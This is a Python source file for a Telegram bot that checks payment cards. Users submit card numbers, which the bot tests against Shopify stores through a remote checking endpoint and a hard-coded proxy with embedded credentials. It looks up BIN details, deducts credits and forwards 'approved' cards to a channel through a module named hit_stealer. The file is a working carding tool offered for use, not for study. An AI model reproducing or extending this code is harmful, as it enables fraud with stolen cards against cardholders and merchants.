import time
import asyncio
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from .response import get_charge_resp
from .gate import check_card, PROXY
from BOT.tools.hit_stealer import send_hit_if_approved

STEALER_CHANNEL_ID = -1002549777556
PROXY = "216.10.27.159:6837:eweduytq:byrw0oc62zlc"
CHECK_URL = "https://kamalxd.com/shopify/sh.php"


def get_msg_id(msg_obj, fallback_msg):
    return (
        getattr(msg_obj, "message_id", None)
        or getattr(msg_obj, "id", None)
        or getattr(fallback_msg, "message_id", None)
        or getattr(fallback_msg, "id", None)
    )


@Client.on_message(filters.command("seturl", [".", "/"]))
async def set_shopify_url(Client, message):
    bot = Client
    text = message.text.strip()
    args = text.split(None, 1)
    if len(args) < 2:
        no_url_msg = f"""╔══════════════════════╗
║ 𝑬𝒓𝒓𝒐𝒓: 𝑵𝒐 𝑼𝒓𝒍 𝑷𝒓𝒐𝒗𝒊𝒅𝒆𝒅 ║
╠══════════════════════╣
║ 𝗨𝘀𝗮𝗴𝗲: /seturl <𝘀𝘁𝗼𝗿𝗲-𝗻𝗮𝗺𝗲> ║
║ 💡 𝘌𝘹𝘢𝘮𝘱𝘭𝘦: /seturl mystore.shopify.com ║
╚══════════════════════╝"""
        await message.reply(no_url_msg)
        return
    url = args[1].strip().replace("https://", "").replace("http://", "").strip("/")

    testing_msg = f"""╔═══════════════════════╗
║ 🔍 𝗧𝗲𝘀𝘁𝗶𝗻𝗴 𝑺𝒊𝒕𝒆... ║
╠═══════════════════════╣
║ 🌐 𝑹𝒖𝒏𝗻𝗶𝗻𝗴 𝘁𝗲𝘀𝘁 𝗼𝗻: {url} ║
╚═══════════════════════╝"""
    reply_msg_obj = await message.reply(testing_msg)

    price, response = test_site_with_card(url)

    if price is None:
        price = "N/A"
        response = f"""success ✅
━━━━━━━━━━━━━━━━━━━━━━
🌐 𝐒𝐢𝐭𝐞: {url}
⚠️ added without without verification 
━━━━━━━━━━━━━━━━━━━━━━"""

    set_user_site(message.from_user.id, url)

    reply_msg = f"""╔══════════════════════════════╗
║   🌟 𝐒𝐢𝐭𝐞 𝐀𝐝𝐝𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 🌟 ║
╠══════════════════════════════╣
║ 🌐 𝐒𝐢𝐭𝐞: {url}
║ 💳 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Shopify Normal
║ 📊 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response}
║ 💰 𝐄𝐬𝐭𝐢𝐦𝐚𝐭𝐞𝐝 𝐏𝐫𝐢𝐜𝐞: {price}$
╚══════════════════════════════╝"""

    await bot.edit_message_text(
        text=reply_msg,
        chat_id=message.chat.id,
        message_id=get_msg_id(reply_msg_obj, message),
    )


def test_site_with_card(site_url):
    from .gate import session, CHECK_URL, PROXY

    test_cards = [
        "4403930331898224|11|30|361",
        "4000000000000002|12|26|123",
        "4242424242424242|01|25|321",
        "5555555555554444|09|24|456",
    ]

    for test_card in test_cards:
        params = {"cc": test_card, "site": site_url, "proxy": PROXY}
        try:
            r = session.get(CHECK_URL, params=params, timeout=30)
            r.raise_for_status()
            data = r.json()

            price = data.get("Price", None)
            response = data.get("Response", None)

            print(f"Test card {test_card} returned price:{price} response:{response}")

            if price is not None and response is not None:
                return price, response

        except Exception as e:
            print(f"Site test error for card {test_card}: {str(e)}")
            continue

    return None, None


@Client.on_message(filters.command("remsites", [".", "/"]))
async def remove_all_sites(Client, message):
    user_id = message.from_user.id
    from mongodb import usersites_collection
    res = usersites_collection.delete_many({"user_id": user_id})
    reply_msg = f"""🗑️ 𝐑𝐞𝐦𝐨𝐯𝐞𝐝 𝐀𝐥𝐥 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐒𝐢𝐭𝐞𝐬
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⟐ 𝐓𝐨𝐭𝐚𝐥 𝐃𝐞𝐥𝐞𝐭𝐞𝐝 : {res.deleted_count} 𝐒𝐢𝐭𝐞𝐬
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    await message.reply(reply_msg)


@Client.on_message(filters.command("check", [".", "/"]))
async def check_user_stored_sites(Client, message):
    user_id = message.from_user.id
    from mongodb import usersites_collection

    sites_cursor = usersites_collection.find({"user_id": user_id})
    sites = list(sites_cursor)
    if not sites:
        no_sites_msg = f"""⛔ 𝐍𝐨 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐒𝐢𝐭𝐞𝐬 𝐅𝐨𝐮𝐧𝐝
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⟐ 𝐘𝐨𝐮 𝐝𝐨𝐧'𝐭 𝐡𝐚𝐯𝐞 𝐚𝐧𝐲 𝐬𝐭𝐨𝐫𝐞𝐝 𝐬𝐢𝐭𝐞𝐬
⟐ 𝐔𝐬𝐞 /𝐬𝐞𝐭𝐮𝐫𝐥 𝐭𝐨 𝐚𝐝𝐝 𝐬𝐭𝐨𝐫𝐞𝐬
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        await message.reply(no_sites_msg)
        return

    reply_lines = [
        "⚡ 𝐘𝐨𝐮𝐫 𝐒𝐭𝐨𝐫𝐞𝐝 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐒𝐢𝐭𝐞𝐬\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    ]
    for site_doc in sites:
        site = site_doc.get("site_url")
        price, response = test_site_with_card(site)

        status = "✔️ 𝐀𝐥𝐢𝐯𝐞" if price is not None else "❌ 𝐃𝐞𝐚𝐝"

        site_info = f"""⟐ {site}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⃟ 𝐒𝐭𝐚𝐭𝐮𝐬 : {status}
⃟ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 : {response}
⃟ 𝐄𝐬𝐭𝐢𝐦𝐚𝐭𝐞𝐝 𝐏𝐫𝐢𝐜𝐞 : {price if price is not None else 'N/A'}$
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        reply_lines.append(site_info)

    reply_msg = "\n".join(reply_lines)
    await message.reply(reply_msg)


@Client.on_message(filters.command("sp", [".", "/"]))
async def self_stored_gate_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        if not getcc:
            no_cc_msg = f"""⚠️ 𝐍𝐨 𝐂𝐚𝐫𝐝 𝐃𝐚𝐭𝐚 𝐅𝐨𝐮𝐧𝐝!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⟐ 𝐘𝐨𝐮 𝐧𝐞𝐞𝐝 𝐭𝐨 𝐬𝐮𝐩𝐩𝐥𝐲 𝐂𝐂 𝐢𝐧 𝐭𝐡𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞
⟐ 𝐔𝐬𝐞 /𝐬𝐩 𝐜𝐜|𝐦𝐞𝐬|𝐚𝐧𝐨|𝐜𝐯𝐯
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
            await message.reply(no_cc_msg)
            return

        fullcc = f"{getcc[0]}|{getcc[1]}|{getcc[2]}|{getcc[3]}"
        site = get_user_site(int(user_id))
        if not site:
            no_site_found_msg = f"""⚠️ ⛔ 𝐍𝐨 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐒𝐢𝐭𝐞 𝐅𝐨𝐮𝐧𝐝!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⟐ 𝐘𝐨𝐮 𝐝𝐨𝐧'𝐭 𝐡𝐚𝐯𝐞 𝐚𝐧𝐲 𝐬𝐢𝐭𝐞 𝐚𝐝𝐝𝐞𝐝
⟐ 𝐔𝐬𝐞 𝐭𝐡𝐞 /𝐬𝐞𝐭𝐮𝐫𝐥 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐭𝐨 𝐚𝐝𝐝 𝐨𝐧𝐞
━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
            await message.reply(no_site_found_msg)
            return

        gateway = "(Self Shopify)"

        firstresp = f"""
↯ Checking.

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> 
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□
</b>
"""
        await asyncio.sleep(0.5)
        firstchk = await message.reply(firstresp)
        firstchk_message_id = get_msg_id(firstchk, message)

        secondresp = f"""
↯ Checking..

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> 
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□
"""
        await asyncio.sleep(0.5)
        try:
            secondchk = await Client.edit_message_text(
                chat_id=message.chat.id, message_id=firstchk_message_id, text=secondresp
            )
        except Exception:
            secondchk = firstchk
        secondchk_message_id = get_msg_id(secondchk, firstchk)

        loop = asyncio.get_event_loop()
        raw_resp = await loop.run_in_executor(None, check_card, fullcc, site, PROXY)
        getresp = await get_charge_resp(raw_resp, user_id, fullcc)

        thirdresp = f"""
↯ Checking...

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> 
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■
"""
        await asyncio.sleep(0.5)
        try:
            await Client.edit_message_text(
                chat_id=message.chat.id, message_id=secondchk_message_id, text=thirdresp
            )
        except Exception:
            pass

        bin6 = fullcc.split("|")[0][:6]
        getbin = await get_bin_details(bin6)
        brand = getbin[0] if len(getbin) > 0 else "Unknown"
        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
        level = getbin[2] if len(getbin) > 2 else "Unknown"
        bank = getbin[3] if len(getbin) > 3 else "Unknown"
        country = getbin[4] if len(getbin) > 4 else "Unknown"
        flag = getbin[5] if len(getbin) > 5 else ""
        currency = getbin[6] if len(getbin) > 6 else "Unknown"

        proxy_status = "Live ✨"
        owner_link = '<a href="tg://user?id=8340881349">𝑺𝑷𝑰𝑫𝑬𝑹</a>'

        finalresp = f"""
{getresp['status']}
━━━━━━━━━━━━━
[⟐] 𝗖𝗖 - <code>{fullcc}</code>
[⟐] 𝗦𝘁𝗮𝘁𝘂𝘀 : {getresp['response']}
[⟐] 𝗚𝗮𝘁𝗲 - {gateway}
━━━━━━━━━━━━━
[⟐] Price - ({getresp.get('price','0')}$)
━━━━━━━━━━━━━
[⟐] B𝗶𝗻 : {bin6}
[⟐] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country} {flag}
[⟐] 𝗜𝘀𝘀𝘂𝗲𝗿 : {bank}
[⟐] 𝗧𝘆𝗽𝗲 : {brand} | {type_}
━━━━━━━━━━━━━
[⟐] T/t : {time.perf_counter() - time.perf_counter():0.2f}s | Proxy : {proxy_status}
[⟐] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a> [ {role} ]
[⟐] 𝗢𝘄𝗻𝗲𝗿: {owner_link}
╚═══════⟐「 𝐂𝐇𝐀𝐑𝐆𝐄 𝐌𝐀𝐒𝐓𝐄𝐑  」⟐═══════╝
"""
        await asyncio.sleep(0.5)
        try:
            await Client.edit_message_text(
                chat_id=message.chat.id, message_id=secondchk_message_id, text=finalresp
            )
        except Exception:
            pass

        await setantispamtime(user_id)
        await deductcredit(user_id)

        if getresp["status"] == "Approved ✅":
            await send_hit_if_approved(Client, finalresp)

    except Exception:
        import traceback

        await error_log(traceback.format_exc())
